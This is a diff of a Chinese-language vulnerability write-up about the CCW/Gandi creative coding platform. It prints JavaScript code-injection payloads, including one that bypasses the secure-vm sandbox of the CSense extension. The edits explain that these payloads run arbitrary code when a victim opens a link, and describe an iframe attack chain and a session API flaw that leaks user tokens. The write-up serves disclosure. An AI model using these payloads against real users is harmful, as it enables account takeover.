@@ -165,7 +165,7 @@ const{stringify}=JSON;JSON.stringify=function(a){return a===jsonObj?(JSON.string
 */jsonObj=fetch('https://community-web.ccw.site/base/dateTime',{method:'POST'}).then(r=>r.json()).then(j=>j.body);const{stringify}=JSON;JSON.stringify=function(a){return a===jsonObj?(JSON.stringify=stringify,a):stringify.apply(this,arguments)}//
 ```
 
-说点题外话，众所周知，部分用户可能会安装 `CSense`，它的部分版本会使用 `secure-vm` 修复代码注入漏洞，但经过我的研究，仍然可以有办法绕过，思路如下：
+说点题外话，众所周知，部分用户可能会安装 CSense，它的部分版本会使用 [secure-vm](https://www.npmjs.com/package/secure-vm) 修复代码注入漏洞，但经过我的研究，仍然可以有办法绕过，思路如下：
 
 ```js
 if (document.location) {
@@ -187,6 +187,8 @@ if (document.location) {
 */if(document.location){jsonObj=fetch('https://community-web.ccw.site/base/dateTime',{method:'POST'}).then(r=>r.json()).then(j=>j.body);const{stringify}=JSON;JSON.stringify=function(a){return a===jsonObj?(JSON.stringify=stringify,a):stringify.apply(this,arguments)}}else{delete this.getValueInJSON;delete this.setValueInJSON;jsonObj.toJSON=_=>{throw''}}//
 ```
 
+以上代码配合 “当计时器 > -1” 的帽子，就可以在浏览器访问 creator 或 gandi 页面的链接后立即执行任意代码。
+
 ---
 
 ## 未上架的扩展
@@ -197,10 +199,10 @@ if (document.location) {
 
 ### detail页面
 
-以前会在加载作品的时候直接执行第三方的脚本，然后才在用户点击 `立即运行` 的时候询问是否运行。  
+以前会在加载作品的时候直接执行第三方的脚本，然后才在用户点击 “立即运行” 的时候询问是否运行。  
 这样的漏洞是非常明显的，脚本没有经过用户同意，就已经执行。  
 
-现在在加载扩展之前就会警告，只有用户点击 `继续运行` 才会运行扩展的脚本，降低了安全风险。  
+现在在加载扩展之前就会警告，只有用户点击 “继续运行” 才会运行扩展的脚本，降低了安全风险。  
 
 ### 其它页面
 
@@ -214,18 +216,15 @@ if (document.location) {
 攻击者可以利用 creator 或 gandi 会立即加载作品的特性，在加载作品的时候执行第三方扩展脚本。  
 用户只需要访问创作页的链接，就会将自己的账号暴露在风险之中。  
 
-对应的，在创作者学院的文章里，可以插入 iframe ，而 iframe 能立即访问 creator 或 gandi ，形成了漏洞链，  
-用户仅需点开文章，就会暴露在风险之中。  
+对应的，在创作者学院的文章里，可以插入 iframe ，而 iframe 能立即访问 creator 或 gandi ，形成了漏洞链，用户仅需点开文章，就会暴露在风险之中。  
 
-当然了，创作页执行上述操作，并不需要使用第三方扩展，  
-只需要使用 CCWData 的代码注入漏洞，配合 `当计时器 < -1` 的帽子，就可以立即执行任意代码。
+当然了，创作页执行上述操作，并不需要使用第三方扩展，只需要使用 CCWData 的代码注入漏洞，配合 “当计时器 > -1” 的帽子，就可以在浏览器访问链接后立即执行任意代码。
 
 ---
 
 ## list_sessions接口
 
-这个接口的漏洞十分明显，攻击者只需要知道如何借助心跳接口获取 HmacMD5 的 key ，就可以搞定 A 请求头和 B 请求头，  
-然后请求这个接口，获取当前用户的 token ，从而盗号。  
+这个接口的漏洞十分明显，攻击者只需要知道如何借助心跳接口获取 HmacMD5 的 key ，就可以搞定 A 请求头和 B 请求头，然后请求这个接口，获取当前用户的 token ，从而盗号。  
 配合代码注入漏洞，形成漏洞攻击链。
 
 CSense 的作者曾多次强调 CSense 无法盗取用户的密码，却隐瞒了这一事实。  
